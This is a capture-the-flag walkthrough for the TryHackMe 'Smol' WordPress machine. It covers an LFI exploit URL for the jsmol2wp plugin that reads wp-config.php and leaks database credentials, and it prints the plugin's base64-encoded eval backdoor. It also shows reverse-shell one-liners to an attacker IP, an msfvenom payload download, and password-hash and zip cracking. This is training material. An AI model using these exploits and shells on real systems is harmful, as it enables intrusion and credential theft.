> [!NOTE]
> https://tryhackme.com/room/smol
> At the heart of **Smol** is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.


>IP:10.10.142.248

# Recon

```
sudo nmap -Pn -p- 10.10.142.248 -sC -sV --vv -T5 
```
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250503213144.png)


```
echo "10.10.142.248    smol.thm www.smol.thm" >> /etc/hosts 
```


```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://www.smol.thm/FFUZ -ic -c
```

![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250503212544.png)

# Creds
```
admin@smol.thm
Jose Mario Llado Marti
by wordpress user
```

```
wpscan --url http://www.smol.thm/ -U admin -P /usr/share/wordlists/rockyou.txt 
```

![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250503213831.png)
http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250503214535.png)

```
https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt
```

# LFI
```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250503221606.png)
```
wpuser:kbLSF2Vop#lw3rjDZ629*Z%G
```

![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250503221950.png)
http://www.smol.thm/wp-admin/post.php?post=58&action=edit
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250503225157.png)

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250503231051.png)
```
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
	
	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
		$lang,
		$chosen
	);
}
```

![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250503231041.png)

# Exploitation

http://www.smol.thm/wp-admin/profile.php?cmt=1&cmd=id
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250503232009.png)

/usr/bin/bash -i &>/dev/tcp/10.11.134.170/1337 <&1' 
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250503232447.png)

```
!!!!!!!!!!!!!!!!!!!!!!!!!!!!
which wget
msfvenom -p linux/x64/shell_reverse_tcp RHOST=10.11.134.170 LPORT=1337 -f elf > shell.elf
python3 -m http.server 80 
wget%20http://10.11.134.170:80/shell.elf%20-O%20/tmp/shell.elf
ls -la /tmp/shell.elf
chmod%20%2Bx%20%2Ftmp%2Fshell.elf
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

```
busybox%20nc%2010.11.134.170%204444%20-e%20bash
```

# LPE
```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 80
```

```
wget http://10.11.134.170/linpeas.sh && chmod +x linpeas.sh  && ./linpeas.sh 
```

Vulnerable to CVE-2021-3560
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504000601.png)
-rw-r--r--  1 root root 291970 Mar 29  2024 wp_backup.sql

```
!!!!!!!!!!!!!!!
wget "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../../opt/wp_backup.sql" -O /home/kali/Desktop/wp_backup.sql
!!!!!!!!!!!!!!!!
```

```
mysql -u wpuser -h 127.0.0.1 -p
kbLSF2Vop#lw3rjDZ629*Z%G
```

## mysql
```
show databases;
use wordpress;
USE wordpress;
select * from wp_users;
```

## Users
```
think:x:1000:1000:,,,:/home/think:/bin/bash
xavi:x:1001:1001::/home/xavi:/bin/bash
diego:x:1002:1002::/home/diego:/bin/bash
gege:x:1003:1003::/home/gege:/bin/bash
```
# users and hash
```
admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |
```
```
$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
```
## hashcat
```
hashcat -h | grep "phpass"   
hashcat -m 400 hash /usr/share/wordlists/rockyou.txt
```
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504011204.png)

![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504011855.png)
# FLAG1
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504012052.png)

## SSH key
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504013949.png)

```
chmod 700 key
ssh -i key think@10.10.162.27
```

# User gege
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504015529.png)
```
su gege
```

![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504015713.png)
## ZIP archive
```
python3 -m http.server 4443
```

```
http://10.10.162.27:4443/wordpress.old.zip
```

![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504020200.png)

```
zip2john wordpress.old.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504022100.png)
## wp-config
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504022244.png)
## User xavi
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504022400.png)
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504022510.png)
# Flag2
![Smol](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Smol/screenshots/20250504022614.png)